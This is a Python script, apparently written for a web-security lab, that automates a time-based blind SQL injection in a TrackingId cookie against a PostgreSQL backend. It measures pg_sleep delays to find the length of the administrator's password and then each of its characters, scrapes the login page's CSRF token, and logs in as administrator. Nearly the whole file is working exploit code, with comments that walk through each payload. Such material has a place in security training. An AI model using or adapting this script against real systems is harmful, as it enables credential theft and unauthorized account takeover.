import time
import requests
import string
import re

# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input
app_url = input("Enter the full target URL: ").strip()


# Create session
session = requests.Session()

response = session.get(app_url,proxies=proxies,verify=False)
cookies = session.cookies.get_dict()
print(cookies)


# print(cookies)
# Convert the dictionary to a string (simulate a raw cookie string if needed)
cookie_str = str(cookies)

# Use regex to extract the TrackingId value
match = re.search(r"'TrackingId': '(.+?)'", cookie_str)
if match:
    tracking_id = match.group(1)
    print("TrackingId:", tracking_id)
else:
    print("TrackingId not found.")

# Confirm that the the parameter is vulnerable to sqli '|| pg_sleep(5)--
# Confirm that the users table exists in the dtabase so we can check the if condition is working or not
# CASE  WHEN condition1 THEN result1  ELSE default_result  END
# if condition1:result1 else: default_result

# '|| (select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end )--'

# to confirm that the users table exists in the database or not  if exist it dealy the 5 second
# '|| (select case when (username='administrator') then pg_sleep(5) else pg_sleep(-1) end from users)--


# Enumerate the password length of the administrator user 
# '|| (select case when (username='administrator' and length(password)>1) then pg_sleep(5) else pg_sleep(-1) end from users)--


print("[*] Determining password length...")

i = 1
while True:
    payload = f"{tracking_id}'|| (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>{i}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--"
    cookies = {'TrackingId': payload}

    start = time.time()
    response = session.get(app_url, cookies=cookies, proxies=proxies, verify=False)
    end = time.time()

    delay = end - start

    if delay > 4.5:
        password_length = i
        print(f"[+] Password is longer than {i}")
        i += 1
    else:
        print(f"[!] Password length is {i}")
        break

# Step 3: Extract password using time-based delay (not error-based)
print("[*] Extracting password...")

extracted_password = ""
ascii_range = range(32, 127)  # All printable ASCII


for position in range(1, password_length + 1):
    found = False
    for ascii_code in ascii_range:
        char = chr(ascii_code)
        payload = (
            f"{tracking_id}'|| (SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTRING(password,{position},1))={ascii_code}) "
            f"THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--"
        )
        # payload = tracking_id + "'|| (SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTRING(password," + str(position) + ",1))=" + str(ascii_code) + ") THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--"

        cookies = {'TrackingId': payload}

        start = time.time()
        session.get(app_url, cookies=cookies, proxies=proxies, verify=False)
        end = time.time()

        if end - start > 4.5:
            extracted_password += char
            print(f"[+] Found character {position}: {char}")
            found = True
            break

    if not found:
        print(f"[-] Failed to extract character at position {position}")
        extracted_password += "?"

print(f"\n[+] Extracted password: {extracted_password}")


# Step 4: Login with extracted password
print("Now lets login as admin, but firstly find csrf token")


res= session.get(app_url+"login",verify=False,proxies=proxies)
token_pattern = re.search(r'name="csrf" value="(.+?)"',res.text)  # way to find csrf token
ftoken = token_pattern.group(1)
print("CSRF token is", ftoken)


a_data = {'username':'administrator','password':extracted_password,'csrf':ftoken}
a_res = session.post(app_url+"/login",verify=False,proxies=proxies,data=a_data)
print("session for admin is", session.cookies.get_dict())